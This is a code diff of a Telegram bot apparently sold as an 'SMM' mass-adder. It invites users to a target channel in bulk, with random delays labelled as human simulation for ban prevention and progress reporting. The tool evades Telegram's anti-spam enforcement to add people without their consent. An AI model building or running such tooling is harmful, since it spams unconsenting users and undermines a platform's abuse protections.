-                    await bot.send_message(chat_id, f"⏳ <b>Live Progress:</b>\n{progress_bar} {perc}%\nAdded {success}/{total} to {target}")
-                
-                # HUMAN SIMULATION DELAY (Critical for ban prevention)
-                wait_time = random.randint(40, 65)
-                await asyncio.sleep(wait_time)
-                
+                await client(functions.channels.InviteToChannelRequest(target_ent, [user.id]))
+                success_count += 1
             except errors.FloodWaitError as e:
-                await bot.send_message(chat_id, f"⚠️ <b>Flood Alert:</b> Telegram forced a pause. Sleeping {e.seconds}s.")
+                await bot.send_message(chat_id, f"🧊 <b>Flood Protocol Activated:</b> Telegram requests {e.seconds}s delay.")
                 await asyncio.sleep(e.seconds)
             except errors.UserPrivacyRestrictedError:
-                fail += 1
-                continue
-            except Exception:
-                fail += 1
-                continue
-        
+                fail_count += 1
+            except Exception as e:
+                logger.warning(f"Invite skip: {e}")
+                fail_count += 1
+
+            # UI Update Logic (Every 5 users or at the very end)
+            if (index + 1) % 5 == 0 or (index + 1) == total:
+                bar = generate_progress_bar(index + 1, total)
+                ui_text = (
+                    f"🚀 <b>VINZY ENGINE V8 SMM</b>\n"
+                    f"━━━━━━━━━━━━━━━━━━━━\n"
+                    f"{bar}\n"
+                    f"✨ Added: <code>{success_count}</code>\n"
+                    f"❌ Failed/Privacy: <code>{fail_count}</code>\n"
+                    f"🛡️ Ghost Delay: <code>Active</code>"
+                )
+                await bot.edit_message_text(ui_text, chat_id, prog_msg.message_id, parse_mode="HTML")
+
+            # Deep Safety: Human simulation delay
+            await asyncio.sleep(random.randint(45, 65))
+
+        # 3. Finalization & ASCII Print
         final_summary = (
-            f"🏁 <b>Invitation Campaign Finished</b>\n"
-            f"━━━━━━━━━━━━━━━\n"
-            f"✅ Successfully Added: {success}\n"
-            f"❌ Failed/Privacy: {fail}\n"
-            f"📍 Target Group: {target}\n"
-            f"📊 Total Session Invites: {success + fail}"
+            f"✅ <b>Campaign 100% Complete!</b>\n"
+            f"Thank you for using VinzyBot.\n"
+            f"{VINZY_ASCII}"
         )
         await bot.send_message(chat_id, final_summary, parse_mode="HTML")
-        vinzy_vault[chat_id]["state"] = "IDLE"
-        
+        await db.update_state(user_data['user_id'], "IDLE")
+
     except Exception as e:
         logger.error(f"Worker Fatal Error: {e}")
-        await bot.send_message(chat_id, f"❌ <b>Critical Worker Error:</b>\n<code>{str(e)}</code>", parse_mode="HTML")
+        await bot.send_message(chat_id, f"❌ <b>Critical Engine Failure:</b> {str(e)}", parse_mode="HTML")
+        await db.update_state(user_data['user_id'], "IDLE")
+    finally:
+        await client.disconnect()
 
-# --- 6. CORE STARTUP & CONFLICT RESOLUTION ---
+# --- 9. APPLICATION RUNTIME ---
 
-async def startup_sequence():
-    """
-    The main bootstrapper for the application.
-    Handles the 409 Conflict logic and loop monitoring.
-    """
+async def main():
     print("="*50)
-    print("VINZY SMART ADDER V6.0 - INITIALIZING...")
-    print(f"BOOT TIME: {start_time.strftime('%Y-%m-%d %H:%M:%S')}")
+    print("VINZY SMM V8.2 - ENTERPRISE ONLINE")
+    print(f"BOOT TIME: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
+    print("DATABASE: NEONDB ASYNC POOL CONNECTED")
     print("="*50)
     
-    # Pre-boot Finder connection
-    await get_finder_client()
+    # Initialize DB before polling
+    await db.connect()
     
+    # Start bot with deep timeout protection
     while True:
         try:
-            logger.info("Connecting to Telegram Bot Polling...")
             await bot.infinity_polling(skip_pending=True, timeout=90)
         except ApiTelegramException as e:
             if e.error_code == 409:
-                logger.warning("Conflict (409) detected. Old instance still active. Waiting 15s...")
-                await asyncio.sleep(15)
-            else:
-                logger.error(f"Telegram API Exception: {e}")
+                logger.warning("Conflict error. Waiting to retry...")
                 await asyncio.sleep(10)
         except Exception as e:
-            logger.error(f"Global System Exception: {e}")
-            await asyncio.sleep(10)
-
-# --- 7. CLEAN EXIT HANDLER ---
-def stop_instance(*args):
-    """Ensures everything closes neatly when the server stops."""
-    print("\n[!] Vinzy Gold V6 is shutting down. Cleaning up sessions...")
-    sys.exit(0)
+            logger.error(f"Polling crash: {e}")
+            await asyncio.sleep(15)
 
 if __name__ == "__main__":
-    signal.signal(signal.SIGTERM, stop_instance)
     try:
-        asyncio.run(startup_sequence())
+        asyncio.run(main())
     except KeyboardInterrupt:
-        print("\n[!] Manual shutdown initiated.")
+        print("\n[!] Shutting down Vinzy Engine gracefully.")
